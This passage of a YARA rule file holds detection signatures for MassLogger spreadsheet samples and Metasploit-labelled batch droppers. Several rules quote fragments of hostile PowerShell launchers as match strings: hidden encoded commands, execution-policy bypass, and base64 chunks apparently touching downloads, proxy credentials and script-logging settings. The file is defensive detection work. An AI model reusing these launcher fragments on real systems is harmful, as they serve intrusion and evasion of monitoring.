      hash1 = "82b9ae10b8b67e81b8b2db9a3bbb5bf49c35bad265da3a2ad367442e4f5aaddd"
   strings:
      $s1 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__69e25126 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_69e25126.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "69e251263be7e552afc9949abb500dcd0567b5c3fb4091383e0e892558e0e309"
   strings:
      $s1 = "$%D%|\\0O" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__e0c223c3 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_e0c223c3.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0c223c32b5a099b8be2c78731102f857ef5f9fb641a0e22542dd6dea5d125d7"
   strings:
      $s1 = "XStPY1h7e6" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s2 = "RoqEx9z:\\G" fullword ascii /* score: '10.00'*/
      $s3 = "* 4O&." fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__8e39ed80 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_8e39ed80.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8e39ed8071b7456c1ab39fe1c0662da0ba15161c34b883b10a6e888613850059"
   strings:
      $s1 = " - \\hnX" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__1d09ae68 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_1d09ae68.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1d09ae68dfe8853502eff3b310b2bdbdb00831b2226e1f219ca2674109bf3898"
   strings:
      $s1 = "IeYe&eGeF" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__9c62a153 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_9c62a153.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9c62a1531f3662bc3e36516d18e3ad4acb6d489da2f47731a3c3be9a68d84819"
   strings:
      $s1 = "- /u^+" fullword ascii /* score: '9.00'*/
      $s2 = "* )^yM." fullword ascii /* score: '9.00'*/
      $s3 = "* g*>i" fullword ascii /* score: '9.00'*/
      $s4 = "* WA!|l" fullword ascii /* score: '9.00'*/
      $s5 = "BYLOGF" fullword ascii /* score: '8.50'*/
      $s6 = "rleioly" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__a3bc10e5 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_a3bc10e5.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a3bc10e5669ad4e5b1d18a00c60c3bd5f7cccde69345f4bb70bc404710452c94"
   strings:
      $s1 = "oDdI.TUO" fullword ascii /* score: '10.00'*/
      $s2 = "\"2]A\\,;" fullword ascii /* score: '9.00'*/ /* hex encoded string '*' */
      $s3 = "* dC2h" fullword ascii /* score: '9.00'*/
      $s4 = "XpkE -5" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__f3ae1f39 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f3ae1f39.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f3ae1f390f004972e602b8b070160e765520a17e6b6a291a2901d69e6d349320"
   strings:
      $s1 = "nwwwwwwww" fullword ascii /* reversed goodware string 'wwwwwwwwn' */ /* score: '18.00'*/
      $s2 = "XGoJ.FMP" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__d3da06e2 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_d3da06e2.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d3da06e29ed7b2fe2c4441b94805205bf0667d39a6c7b834899d73102d884f50"
   strings:
      $s1 = "IGETGH^<" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__a2f57d0e {
   meta:
      description = "_subset_batch - file MassLogger(signature)_a2f57d0e.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2f57d0e79f8f06c984be2aac660569eedcb8fa3eff303bbe6baa42f6eeacd54"
   strings:
      $s1 = "IeYe&eGeF" fullword ascii /* score: '9.00'*/
      $s2 = "`5$\",@+A" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
      $s3 = "#5 5\"5!5#" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UU' */
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__68a8275a {
   meta:
      description = "_subset_batch - file MassLogger(signature)_68a8275a.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68a8275aa4ccac36daaef13527c2713ad7c5e185f3973c6f4327e6b48652078c"
   strings:
      $s1 = "** s\"p" fullword ascii /* score: '9.00'*/
      $s2 = "jCjG* u u\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__80ca8e84 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_80ca8e84.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "80ca8e844c419a59f08e7472126548baead662460d8a84a2790a41855b23958b"
   strings:
      $s1 = "Mwvo.cVX" fullword ascii /* score: '10.00'*/
      $s2 = "+Siwd* 7`*L" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__e4a7f4d1 {
   meta:
      description = "_subset_batch - file MassLogger(signature)_e4a7f4d1.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4a7f4d17ae4f392713b90b301313b2976b9926d6d2784ce02079aa04ccd8bd0"
   strings:
      $s1 = " 3mHfO X:\\" fullword ascii /* score: '10.00'*/
      $s2 = "* ;rLvb" fullword ascii /* score: '9.00'*/
      $s3 = "$c.pdB]," fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule MassLogger_signature__a43991ca {
   meta:
      description = "_subset_batch - file MassLogger(signature)_a43991ca.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a43991cafa5908e6e624916b3e7adf644774f9c48268780e379df6897c4a140e"
   strings:
      $s1 = "Pwwwwww" fullword ascii /* reversed goodware string 'wwwwwwP' */ /* score: '16.00'*/
      $s2 = "EIqq.vRQ" fullword ascii /* score: '10.00'*/
      $s3 = "+ /syz" fullword ascii /* score: '9.00'*/
      $s4 = "?KMAMs27e" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 7000KB and
      all of them
}

rule Metasploit_signature__2 {
   meta:
      description = "_subset_batch - file Metasploit(signature).bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2decde2ad9b56abb32ec27ddba67860404c1919d30b387559cd043206229a78"
   strings:
      $s1 = "NgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsA" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s2 = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAFIAcwBJAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAFIAUwBJAE8AbgAuAE0AYQBKAG8AUgAgAC0A" ascii /* score: '21.00'*/
      $s3 = "QQBOAEEAZwBFAFIAXQA6ADoARQB4AHAAZQBDAFQAMQAwADAAQwBvAG4AVABJAE4AVQBFAD0AMAA7ACQAZQBiAEQAZAA9AE4AZQB3AC0ATwBiAGoARQBjAHQAIABTAFkA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "JABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "dgBZAGkAVQBvAHEAUwBLAE8AVQBPAD0AUwA2AFMAeABtAGYAWQBBAEwAZAAvAFoAdQBUAE0AbQBqAEsASgBxAHgAbgBDAE0AbwBrAEkAPQAiACkAOwAkAEQAYQB0AGEA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "JABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s7 = "agAyAHoAdgBiAFUAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s8 = "ZQB0AC4AQwBSAEUAZABlAG4AdABpAGEATABDAEEAYwBoAEUAXQA6ADoARABlAGYAYQB1AGwAdABOAEUAVABXAE8AcgBLAEMAUgBlAGQARQBOAFQASQBhAGwAUwA7ACQA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "PQAkAEUAQgBkAGQALgBEAG8AdwBOAEwATwBhAGQARABBAHQAYQAoACQAUwBlAFIAKwAkAFQAKQA7ACQAaQB2AD0AJABEAEEAVABBAFsAMAAuAC4AMwBdADsAJABEAGEA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "RQB0AFYAYQBsAHUAZQAoACQATgB1AGwATAAsACQAdAByAFUAZQApADsAfQA7AFsAUwB5AFMAVABFAG0ALgBOAEUAdAAuAFMARQBSAFYAaQBDAGUAUABvAGkAbgBUAE0A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "JABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABlAEIAZABEAC4ASABFAGEAZABFAFIAUwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBuAG8AbgBLAGsA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s12 = "RQB0AFYAQQBMAHUARQAoACQATgBVAGwATAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAEwARQBDAFQASQBvAE4AcwAuAEcAZQBuAGUAUgBpAEMALgBIAGEA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s13 = "QQBEAFEAQQBOAEEAQQB1AEEARABFAEEATgBnAEEAegBBAEMANABBAE0AZwBBAHcAQQBEAE0AQQBPAGcAQQAzAEEARABjAEEATwBBAEEANABBAEEAPQA9ACcAKQApACkA" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s14 = "JwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABiADMAOQA5AFsAJwBTAGMAcgBpAHAAdABCACcA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s15 = "UwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMA" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__1ae5bccc {
   meta:
      description = "_subset_batch - file Metasploit(signature)_1ae5bccc.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1ae5bccc24447fd6ecf4fe1f16b284af42332a248652253a774fbafb9c893813"
   strings:
      $s1 = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AcgAgAC0A" ascii /* score: '22.00'*/
      $s2 = "dQApADsAJAA1ADcAOQAzAC4AUAByAG8AeABZAD0AWwBTAHkAUwB0AEUAbQAuAE4ARQB0AC4AVwBlAEIAUgBlAHEAdQBFAFMAVABdADoAOgBEAGUAZgBBAFUATAB0AFcA" ascii /* base64 encoded string */ /* score: '22.00'*/
      $s3 = "dAA6AFAAcgBvAHgAeQAgAD0AIAAkADUANwA5ADMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBNAC4AVABFAFgAdAAuAEUAbgBDAG8AZABpAG4ARwBdADoA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "bgBMAE8AQQBkAEQAYQBUAEEAKAAkAFMARQBSACsAJABUACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQARABhAFQAQQBbADQA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s5 = "WwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAHIAUwBJAE8AbgAuAE0AYQBqAE8AcgAgAC0A" ascii /* score: '21.00'*/
      $s7 = "UwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "ZQBiAFAAUgBvAHgAWQA7ACQANQA3ADkAMwAuAFAAUgBPAHgAWQAuAEMAUgBFAEQARQBOAFQAaQBBAGwAcwAgAD0AIABbAFMAWQBTAHQARQBtAC4ATgBlAHQALgBDAFIA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "ZQB0AFYAQQBsAFUAZQAoACQAbgBVAGwAbAAsACQAdAByAHUARQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAdAAuAFMARQBSAFYAaQBjAEUAUABvAGkATgB0AE0A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "QQBOAEEAZwBFAFIAXQA6ADoARQBYAFAARQBjAFQAMQAwADAAQwBPAE4AdABpAE4AVQBlAD0AMAA7ACQANQA3ADkAMwA9AE4ARQB3AC0ATwBiAGoAZQBDAFQAIABTAHkA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "QQBEAFEAQQBOAEEAQQB1AEEARABFAEEATgBnAEEAegBBAEMANABBAE0AZwBBAHcAQQBEAE0AQQBPAGcAQQAzAEEARABjAEEATwBBAEEANABBAEEAPQA9ACcAKQApACkA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s12 = "UwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s13 = "LgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s14 = "KwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcA" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s15 = "VQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMA" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__2e0c0cc2 {
   meta:
      description = "_subset_batch - file Metasploit(signature)_2e0c0cc2.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2e0c0cc26fc95d78e41bb257ac142a0fd8af3383ff343ad92534811ddc8b707c"
   strings:
      $s1 = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBpAG8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBKAE8AcgAgAC0A" ascii /* score: '21.00'*/
      $s2 = "XwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s3 = "MAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAG4AVABdACkAJQAyADUANgA7ACQAUwBbACQA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s4 = "QwBvAG8AawBpAGUAIgAsACIAZwBTAHMAZwB4AEMAbABnAHEAQgA9AG8AOABPAEYAMQBKAHgAbgBiAG0AQwBOAGMAdgBnAGoAOAB6AHUASABhADQAUQA3AGwAQQBNAD0A" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s5 = "YQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAG4AdQBsAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAG8ATABMAGUAQwB0AEkAbwBuAFMALgBHAEUA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s6 = "JABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "IgApADsAJABkAEEAVABBAD0AJABhADkANAA4ADYALgBEAG8AdwBOAGwATwBhAEQARABBAHQAYQAoACQAUwBFAHIAKwAkAFQAKQA7ACQASQBWAD0AJABEAGEAVABhAFsA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "YQB0AGkAYwAnACkALgBTAEUAVABWAGEAbABVAGUAKAAkAE4AVQBMAEwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBTAEUAUgB2AEkA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s9 = "MAAuAC4AMwBdADsAJABkAEEAVABBAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABhAC4AbABFAE4ARwB0AEgAXQA7AC0AagBvAEkAbgBbAEMASABBAHIAWwBdAF0A" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s10 = "cQB1AEUAUwBUAF0AOgA6AEQAZQBGAGEAVQBMAFQAVwBFAEIAUAByAE8AWAB5ADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkALgBDAHIARQBEAEUAbgBUAEkAYQBMAFMA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "bwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgAZQBBAEQARQByAHMALgBBAGQARAAoACIA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s12 = "WwBDAE8ATgBWAEUAUgBUAF0AOgA6AEYAcgBvAG0AQgBhAFMAZQA2ADQAUwB0AFIASQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s13 = "cgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBMAH0ARQBMAHMAZQB7AFsAUwBjAHIAaQBwAHQA" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s14 = "RABLAF0AbAAuACsAeQBGAD8AfQBMAE4APQBqADIAegB2AGIAVQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s15 = "ZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcA" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 20KB and
      8 of them
}

rule Metasploit_signature__48c668e2 {
   meta:
      description = "_subset_batch - file Metasploit(signature)_48c668e2.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48c668e232b344dda435759e456358da4e3d8c9ba062e7a267ae7d85f409f1e0"
   strings:
      $x1 = "# 2>NUL & @CLS & PUSHD \"%~dp0\" & \"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nol -nop -ep bypass \"[I" ascii /* score: '47.00'*/
      $x2 = "# 2>NUL & @CLS & PUSHD \"%~dp0\" & \"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nol -nop -ep bypass \"[I" ascii /* score: '44.00'*/
      $s3 = "XwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "IgApADsAJABkAGEAdABBAD0AJAA4AEYANQBiADkALgBEAG8AVwBuAEwAbwBhAGQARABBAHQAQQAoACQAUwBlAFIAKwAkAFQAKQA7ACQAaQBWAD0AJABkAEEAdABBAFsA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s5 = "MAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s6 = "YQB0AGkAYwAnACkALgBTAEUAdABWAGEAbABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQBXAC0ATwBiAGoAZQBDAFQAIABDAG8AbABsAGUAQwB0AGkAbwBuAFMALgBHAEUA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "TwBiAGoAZQBDAHQAIABTAFkAcwBUAGUATQAuAE4AZQB0AC4AVwBFAEIAQwBMAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "TwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADgARgA1AGIAOQAuAEgARQBBAGQARQBSAHMALgBBAEQAZAAoACIA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s9 = "YQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAEUAKAAkAE4AVQBsAEwALAAkAFQAcgB1AEUAKQA7AH0AOwBbAFMAWQBTAFQAZQBNAC4ATgBlAFQALgBTAEUAcgB2AEkA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s10 = "MAAuAC4AMwBdADsAJABEAGEAdABhAD0AJABEAGEAVABBAFsANAAuAC4AJABEAEEAVABhAC4ATABFAE4ARwB0AGgAXQA7AC0ASgBvAGkAbgBbAEMASABBAFIAWwBdAF0A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s11 = "powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAUwBJAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8AbgAuAE0AYQBqAG8AcgAgAC0A" ascii /* score: '21.00'*/
      $s12 = "ZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s13 = "NABBAEQATQBBAEwAZwBBAHkAQQBEAFEAQQBOAEEAQQB1AEEARABFAEEATgBnAEEAegBBAEMANABBAE0AZwBBAHcAQQBEAE0AQQBPAGcAQQAzAEEARABjAEEATwBBAEEA" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s14 = "TQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUA" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s15 = "YwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQA" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule Metasploit_signature__720dc997 {
   meta:
      description = "_subset_batch - file Metasploit(signature)_720dc997.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "720dc997d708d9e6a62e781dcb28e915ae5e14f80adc2439316b74412fe26afe"
   strings:
      $x1 = "# 2>NUL & @CLS & PUSHD \"%~dp0\" & \"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nol -nop -ep bypass \"[I" ascii /* score: '47.00'*/
      $x2 = "# 2>NUL & @CLS & PUSHD \"%~dp0\" & \"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nol -nop -ep bypass \"[I" ascii /* score: '44.00'*/
      $s3 = "JABuAHUATABMACwAJAB0AFIAVQBlACkAOwB9ADsAWwBTAHkAcwBUAGUAbQAuAE4AZQB0AC4AUwBFAFIAVgBJAEMARQBQAE8AaQBOAHQATQBhAE4AQQBnAEUAcgBdADoA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s4 = "powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAUwBJAE8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0A" ascii /* score: '21.00'*/
      $s5 = "KQA7ACQANAA2AGQALgBQAHIATwBYAFkAPQBbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQAZQBGAEEAVQBMAHQAVwBlAEIA" ascii /* base64 encoded string*/ /* score: '21.00'*/
      $s6 = "SQBJAC4ARwBlAFQAQgBZAFQAZQBzACgAJwBTAEAAPgBaAH4AYQBwACwAbgBvAGUAMABKAEQASwBdAGwALgArAHkARgA/AH0ATABOAD0AagAyAHoAdgBiAFUAJwApADsA" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s7 = "KwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8A" ascii /* base64 encoded string  */ /* score: '21.00'*/
      $s8 = "YQBUAGEAKAAkAHMAZQBSACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAHQAQQA9ACQARABBAHQAQQBbADQALgAuACQARABhAFQA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s9 = "bQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAGwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAA" ascii /* base64 encoded string  */ /* score: '21.00'*/
